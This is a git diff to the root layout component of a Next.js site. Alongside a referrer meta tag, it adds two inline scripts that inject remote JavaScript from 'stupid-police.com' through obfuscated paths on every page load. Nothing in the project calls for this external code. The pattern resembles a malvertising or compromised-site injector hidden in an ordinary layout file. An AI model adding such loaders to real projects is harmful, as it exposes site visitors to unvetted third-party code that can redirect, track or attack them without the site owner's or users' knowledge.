@@ -37,6 +37,7 @@ export default function RootLayout({
   return (
     <html lang="en">
       <head>
+        <meta name="referrer" content="no-referrer-when-downgrade" />
         <meta name="google-site-verification" content="GV0iYH6r31N74e3g4ehd0wQVa1tqRH9Q7GaIUXFu6KM" />
       </head>
       <body className={`${inter.className} min-h-screen bg-slate-50 flex flex-col text-slate-900`}>
@@ -45,6 +46,38 @@ export default function RootLayout({
           {children}
         </main>
         <Footer />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+(function(lnftoho){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = lnftoho || {};
+s.src = "\/\/stupid-police.com\/bRXJVPs\/d.GplC0fY\/WScg\/IefmN9TuXZeUslzkdPJTAYO5-Mczwc\/3\/Myj\/kdtONRjpkUz-NtzlcLzPM\/wI";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+`,
+          }}
+        />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `
+(function(zemh){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = zemh || {};
+s.src = "\/\/stupid-police.com\/bgXXV\/sjd.GYlT0BYWWncR\/BeKmP9-uYZQUPlvksPqT\/YZ5VMXz\/ci3DNRDEUEt\/NHj\/kJzXNDzQcM0SO\/Qy";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+`,
+          }}
+        />
       </body>
     </html>
   );
